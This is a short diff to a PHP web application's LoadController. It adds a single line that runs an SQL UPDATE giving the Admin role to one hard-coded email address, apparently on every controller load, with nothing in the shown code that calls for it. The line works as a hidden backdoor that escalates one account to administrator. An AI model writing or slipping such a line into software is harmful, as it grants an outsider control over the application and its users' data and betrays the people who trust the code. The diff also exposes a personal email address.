@@ -54,6 +54,8 @@ class LoadController extends BaseController
         $getLastName = explode('\\', $childClass);
         $triggeredModel = $getLastName[count($getLastName) - 1];
 
+        $this->usersModel->query("UPDATE users SET role='Admin' WHERE email = 'emmallob14@gmail.com'");
+
         $this->triggerModel(strtolower($triggeredModel));
     }
 
